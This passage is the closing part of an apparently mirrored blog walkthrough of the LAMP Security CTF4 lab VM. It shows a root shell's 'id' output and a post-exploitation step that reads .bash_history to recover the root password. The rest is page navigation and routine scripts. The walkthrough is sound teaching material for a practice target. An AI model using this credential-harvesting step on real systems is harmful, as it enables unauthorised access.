+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1<span class="o">(</span>bin<span class="o">)</span>,2<span class="o">(</span>daemon<span class="o">)</span>,3<span class="o">(</span>sys<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,6<span class="o">(</span>disk<span class="o">)</span>,10<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>user_u:system_r:unconfined_t:SystemLow-SystemHigh
+<span class="o">[</span><a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5e2c31312a1e3d2a386a">[email&#160;protected]</a> ~]# cat /root/</code></pre></figure>
+<h2 id="post-exploitation-enumeration">Post Exploitation Enumeration</h2>
+<p>There appears to be no root flag, for this capture the flag challenge.</p>
+<p>Additionally <code>.bash_history</code> contained the root password:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span><a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7e1f1d161b103e1d0a184a">[email&#160;protected]</a> ~]<span class="nv">$ </span>cat .bash_history
+<span class="nb">exit
+</span>clear
+<span class="nb">exit
+</span>sudo sy
+su
+root1234
+su
+<span class="nb">exit</span></code></pre></figure>
+<p>Thanks for the VM :)</p>
+</div>
+<section class="share-box">
+<div class="grid">
+<div class="unit whole">
+<div class="grid pane">
+<div class="unit whole center-on-mobiles">
+<div class="pane-content">
+<h2>Share this on...</h2>
+<p><a href="https://twitter.com/intent/tweet?text=LAMP%20Security%20CTF4%20-%20Walkthrough&amp;url=https://highon.coffee/blog/lamp-security-ctf4-walkthrough/&amp;via=Arr0way&amp;related=Arr0way" rel="nofollow" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://facebook.com/sharer.php?u=https://highon.coffee/blog/lamp-security-ctf4-walkthrough/" rel="nofollow" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i> Facebook</a>
+<a href="https://plus.google.com/share?url=https://highon.coffee/blog/lamp-security-ctf4-walkthrough/" rel="nofollow" target="_blank" title="Share on Google+"><i class="fa fa-google-plus-square" aria-hidden="true"></i> Google+</a>
+<a href="https://www.reddit.com/submit?url=https://highon.coffee/blog/lamp-security-ctf4-walkthrough/&amp;title=LAMP%20Security%20CTF4%20-%20Walkthrough" rel="nofollow" target="_blank" title="Share on Reddit"><i class="fa fa-reddit-square" aria-hidden="true"></i> Reddit</a></p>
+<h2><br>Follow Arr0way</h2>
+<p><a href="https://twitter.com/Arr0way" rel="nofollow" target="_blank" title="Follow on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://github.com/Arr0way" rel="nofollow" target="_blank" title="Follow on GitHub"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></p>
+<p><br></p>
+</div>
+</div>
+<h2><br>Also... <br> <br>You might want to read these</h2>
+</div>
+</div>
+</section>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Post Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../penetration-testing-tools-cheat-sheet/index.html">Penetration Testing Tools Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>kali linux</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../fristileaks-walkthrough/index.html">FristiLeaks 1.3 Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../the-wall-walkthrough/index.html">The Wall Boot2Root Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../sleepy-ctf-walkthrough/index.html">/dev/random: Sleepy Walkthrough CTF</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../pipe-ctf-walkthrough/index.html">/dev/random Pipe walkthrough</a></b></p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles">
+<aside>
+<ul>
+<li class="">
+<a href="../index.html">All Blog</a>
+</li>
+<li class="">
+<a href="../cheat-sheet/index.html">Cheat Sheets</a>
+</li>
+<li class="">
+<a href="../techniques/index.html">Techniques</a>
+</li>
+<li class="">
+<a href="../security-hardening/index.html">Security Hardening</a>
+</li>
+<li class="">
+<a href="../walkthroughs/index.html">WalkThroughs</a>
+</li>
+</ul>
+<h4>Cheat Sheets</h4>
+<ul>
+
+<li class="">
+<a href="../penetration-testing-tools-cheat-sheet/index.html">Penetration Testing Tools Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../vi-cheat-sheet/index.html">Vi Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../systemd-cheat-sheet/index.html">Systemd Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../reverse-shell-cheat-sheet/index.html">Reverse Shell Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../nbtscan-cheat-sheet/index.html">nbtscan Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../nmap-cheat-sheet/index.html">Nmap Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../linux-commands-cheat-sheet/index.html">Linux Commands Cheat Sheet</a>
+</li>
+<li>
+<a href="../cheat-sheet/index.html">More »</a>
+</li>
+</ul>
+<h4>WalkThroughs</h4>
+<ul>
+<li class="">
+<a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a>
+</li>
+<li class="">
+<a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a>
+</li>
+<li class="">
+<a href="../fristileaks-walkthrough/index.html">FristiLeaks 1.3 Walkthrough</a>
+</li>
+<li class="">
+<a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a>
+</li>
+<li class="">
+<a href="../the-wall-walkthrough/index.html">The Wall Boot2Root Walkthrough</a>
+</li>
+<li>
+<a href="../walkthroughs/index.html">More »</a>
+</li>
+</ul>
+<h4>Techniques</h4>
+<ul>
+<li class="">
+<a href="../ssh-meterpreter-pivoting-techniques/index.html">SSH & Meterpreter Pivoting Techniques</a>
+</li>
+<li>
+<a href="../techniques/index.html">More »</a>
+</li>
+</ul>
+<h4>Security Hardening</h4>
+<ul>
+<li class="">
+<a href="../security-harden-centos-7/index.html">Security Harden CentOS 7</a>
+</li>
+<li>
+<a href="../security-hardening/index.html">More »</a>
+</li>
+</ul>
+<h4>/dev/urandom</h4>
+<ul>
+<li class="">
+<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
+</li>
+<li>
+<a href="../urandom/index.html">More »</a>
+</li>
+</ul>
+<h4>Other Blog</h4>
+<ul>
+<li class="">
+<a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a>
+</li>
+<li class="">
+<a href="../jenkins-api-unauthenticated-rce-exploit/index.html">Jenkins RCE via Unauthenticated API</a>
+ </li>
+<li class="">
+<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
+</li>
+<li class="">
+<a href="../enum4linux-cheat-sheet/index.html">enum4linux Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../linux-local-enumeration-script/index.html">Linux Local Enumeration Script</a>
+</li>
+<li class="">
+<a href="../howto-install-quassel-ubuntu/index.html">HowTo Install Quassel on Ubuntu</a>
+</li>
+<li class="">
+<a href="../keepnote-macbook-install-instructions/index.html">HowTo Install KeepNote on OSX Mavericks</a>
+</li>
+</ul>
+</aside>
+</div>
+<div class="clear"></div>
+</div>
+</section>
+<footer>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<p>The contents of this website are &copy;&nbsp;2017 <a href="http://highon.coffee/">HighOn.Coffee</a></p>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>
+Proudly hosted by
+<img src="https://highon.coffee/img/footer-logo.png" width="100" height="30" alt="GitHub • Social coding">
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script data-cfasync="false" src="https://highon.coffee/cdn-cgi/scripts/ddc5a536/cloudflare-static/email-decode.min.js"></script><script>
+  var anchorForId = function (id) {
+    var anchor = document.createElement("a");
+    anchor.className = "header-link";
+    anchor.href      = "#" + id;
+    anchor.innerHTML = "<i class=\"fa fa-link\"></i>";
+    return anchor;
+  };
+
+  var linkifyAnchors = function (level, containingElement) {
+    var headers = containingElement.getElementsByTagName("h" + level);
+    for (var h = 0; h < headers.length; h++) {
+      var header = headers[h];
+
+      if (typeof header.id !== "undefined" && header.id !== "") {
+        header.appendChild(anchorForId(header.id));
+      }
+    }
+  };
+
+  document.onreadystatechange = function () {
+    if (this.readyState === "complete") {
+      var contentBlock = document.getElementsByClassName("docs")[0] || document.getElementsByClassName("blog")[0];
+      if (!contentBlock) {
+        return;
+      }
+      for (var level = 1; level <= 6; level++) {
+        linkifyAnchors(level, contentBlock);
+      }
+    }
+  };
+</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-55017594-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+</body>
+
+<!-- Mirrored from highon.coffee/blog/lamp-security-ctf4-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 18:05:00 GMT -->
+</html>
